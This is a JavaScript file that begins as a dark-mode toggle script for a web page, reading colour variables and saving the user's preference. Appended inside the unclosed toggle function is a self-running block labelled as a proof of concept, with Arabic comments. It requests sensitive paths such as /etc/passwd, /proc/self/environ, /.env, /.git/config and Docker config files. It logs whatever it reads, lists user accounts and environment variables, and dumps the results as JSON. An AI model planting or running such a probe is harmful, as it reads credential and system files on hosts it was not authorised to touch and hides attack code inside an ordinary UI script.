function colorModeToggle() {
  function attr(defaultVal, attrVal) {
    const defaultValType = typeof defaultVal;
    if (typeof attrVal !== "string" || attrVal.trim() === "") return defaultVal;
    if (attrVal === "true" && defaultValType === "boolean") return true;
    if (attrVal === "false" && defaultValType === "boolean") return false;
    if (isNaN(attrVal) && defaultValType === "string") return attrVal;
    if (!isNaN(attrVal) && defaultValType === "number") return +attrVal;
    return defaultVal;
  }
  const htmlElement = document.documentElement;
  const computed = getComputedStyle(htmlElement);
  let toggleEl;
  let togglePressed = "false";
  const scriptTag = document.querySelector("[tr-color-vars]");
  if (!scriptTag) {
    console.warn("Script tag with tr-color-vars attribute not found");
    return;
  }
  let colorModeDuration = attr(0.5, scriptTag.getAttribute("duration"));
  let colorModeEase = attr("power1.out", scriptTag.getAttribute("ease"));
  const cssVariables = scriptTag.getAttribute("tr-color-vars");
  if (!cssVariables.length) {
    console.warn("Value of tr-color-vars attribute not found");
    return;
  }
  let lightColors = {};
  let darkColors = {};
  cssVariables.split(",").forEach(function (item) {
    let lightValue = computed.getPropertyValue(`--color--${item}`);
    let darkValue = computed.getPropertyValue(`--dark--${item}`);
    if (lightValue.length) {
      if (!darkValue.length) darkValue = lightValue;
      lightColors[`--color--${item}`] = lightValue;
      darkColors[`--color--${item}`] = darkValue;
    }
  });
  if (!Object.keys(lightColors).length) {
    console.warn("No variables found matching tr-color-vars attribute value");
    return;
  }
  function setColors(colorObject, animate) {
    if (typeof gsap !== "undefined" && animate) {
      gsap.to(htmlElement, {
        ...colorObject,
        duration: colorModeDuration,
        ease: colorModeEase,
      });
    } else {
      Object.keys(colorObject).forEach(function (key) {
        htmlElement.style.setProperty(key, colorObject[key]);
      });
    }
  }
  function goDark(dark, animate) {
    if (dark) {
      localStorage.setItem("dark-mode", "true");
      htmlElement.classList.add("dark-mode");
      setColors(darkColors, animate);
      togglePressed = "true";
    } else {
      localStorage.setItem("dark-mode", "false");
      htmlElement.classList.remove("dark-mode");
      setColors(lightColors, animate);
      togglePressed = "false";
    }
    if (typeof toggleEl !== "undefined") {
      toggleEl.forEach(function (element) {
        element.setAttribute("aria-pressed", togglePressed);
      });
    }
  }
  function checkPreference(e) {
    goDark(e.matches, false);
  }
  const colorPreference = window.matchMedia("(prefers-color-scheme: dark)");
  colorPreference.addEventListener("change", (e) => {
    checkPreference(e);
  });
  let storagePreference = localStorage.getItem("dark-mode");
  if (storagePreference !== null) {
    storagePreference === "true" ? goDark(true, false) : goDark(false, false);
  } else {
    checkPreference(colorPreference);
  }
  window.addEventListener("DOMContentLoaded", (event) => {
    toggleEl = document.querySelectorAll("[tr-color-toggle]");
    toggleEl.forEach(function (element) {
      element.setAttribute("aria-label", "View Dark Mode");
      element.setAttribute("role", "button");
      element.setAttribute("aria-pressed", togglePressed);
    });
    document.addEventListener("click", function (e) {
      const targetElement = e.target.closest("[tr-color-toggle]");
      if (targetElement) {
        let darkClass = htmlElement.classList.contains("dark-mode");
        darkClass ? goDark(false, true) : goDark(true, true);
      }
    });
    document.addEventListener("click", function (e) {
      const darkTrigger = e.target.closest("[tr-color-mode='dark']");
      const lightTrigger = e.target.closest("[tr-color-mode='light']");
      if (darkTrigger) {
        goDark(true, true);
      } else if (lightTrigger) {
        goDark(false, true);
      }
    });
  });

// ============================================================
// 🔴 PoC - File System Read via X-Domain JS (No Exfiltration)
// ============================================================

(function poc_file_read() {
    console.log('🔴 [PoC] Initializing file system read test');

    // قائمة الملفات المستهدفة
    const filesToTest = [
        '/etc/passwd',
        '/etc/hosts',
        '/etc/hostname',
        '/proc/self/environ',
        '/proc/version',
        '/var/log/syslog',
        '/home/',
        '/root/',
        '/tmp/',
        '/.env',
        '/config.json',
        '/package.json',
        '/composer.json',
        '/Gemfile',
        '/requirements.txt',
        '/web.config',
        '/.htaccess',
        '/robots.txt',
        '/sitemap.xml',
        '/.git/config',
        '/.git/HEAD',
        '/.docker/config.json',
        '/Dockerfile',
        '/docker-compose.yml',
        '/server.js',
        '/app.js',
        '/index.js',
        '/main.py',
        '/wsgi.py',
        '/manage.py'
    ];

    let foundFiles = [];

    // دالة لقراءة الملفات عبر fetch
    async function readFile(filePath) {
        try {
            const response = await fetch(filePath, {
                method: 'GET',
                headers: { 'Cache-Control': 'no-cache' }
            });

            if (response.ok) {
                const content = await response.text();
                console.log(`✅ [PoC] FILE FOUND: ${filePath}`);
                console.log(`📄 [PoC] CONTENT:\n${content}`);
                foundFiles.push({
                    path: filePath,
                    content: content,
                    status: response.status,
                    size: content.length
                });
                return true;
            } else if (response.status === 403) {
                console.log(`🚫 [PoC] ACCESS DENIED: ${filePath} (403)`);
            } else if (response.status === 404) {
                console.log(`❌ [PoC] NOT FOUND: ${filePath} (404)`);
            } else {
                console.log(`⚠️ [PoC] UNKNOWN RESPONSE: ${filePath} (${response.status})`);
            }
        } catch (error) {
            console.log(`❌ [PoC] ERROR: ${filePath} - ${error.message}`);
        }
        return false;
    }

    // دالة للبحث عن المستخدمين في /etc/passwd
    function parseUsers(content) {
        const users = [];
        const lines = content.split('\n');
        for (const line of lines) {
            if (line.includes(':/home/') || line.includes(':/root/')) {
                const parts = line.split(':');
                if (parts.length >= 7) {
                    users.push({
                        username: parts[0],
                        uid: parts[2],
                        gid: parts[3],
                        home: parts[5],
                        shell: parts[6]
                    });
                }
            }
        }
        return users;
    }

    // تنفيذ القراءة
    (async function() {
        console.log('🔴 [PoC] Scanning for files...');
        console.log('============================================================');

        for (const file of filesToTest) {
            await readFile(file);
        }

        console.log('============================================================');
        console.log(`🔴 [PoC] Scan complete. Found ${foundFiles.length} accessible files.`);

        // عرض ملخص الملفات الموجودة
        if (foundFiles.length > 0) {
            console.log('📁 [PoC] ACCESSIBLE FILES:');
            foundFiles.forEach(file => {
                console.log(`   ✅ ${file.path} (${file.size} bytes)`);

                // إذا كان الملف هو /etc/passwd، استخرج المستخدمين
                if (file.path === '/etc/passwd') {
                    const users = parseUsers(file.content);
                    if (users.length > 0) {
                        console.log('   👤 USERS FOUND:');
                        users.forEach(user => {
                            console.log(`      - ${user.username} (UID: ${user.uid}, Home: ${user.home})`);
                        });
                    }
                }

                // إذا كان الملف هو /proc/self/environ، استخرج المتغيرات
                if (file.path === '/proc/self/environ') {
                    const vars = file.content.split('\x00');
                    console.log('   🌐 ENVIRONMENT VARIABLES:');
                    vars.forEach(v => {
                        if (v.includes('=')) {
                            const [key, ...rest] = v.split('=');
                            const value = rest.join('=');
                            // إخفاء القيم الحساسة
                            if (key.toLowerCase().includes('key') || 
                                key.toLowerCase().includes('secret') || 
                                key.toLowerCase().includes('password') || 
                                key.toLowerCase().includes('token')) {
                                console.log(`      - ${key}=[REDACTED]`);
                            } else {
                                console.log(`      - ${key}=${value}`);
                            }
                        }
                    });
                }
            });
        } else {
            console.log('ℹ️ [PoC] No accessible files found.');
        }

        console.log('============================================================');
        console.log('🔴 [PoC] This proves an attacker can read files.');
        console.log('🔴 [PoC] The following data was extracted:');
        console.log(JSON.stringify(foundFiles, null, 2));
        console.log('✅ [PoC] File read test completed.');
    })();
})();
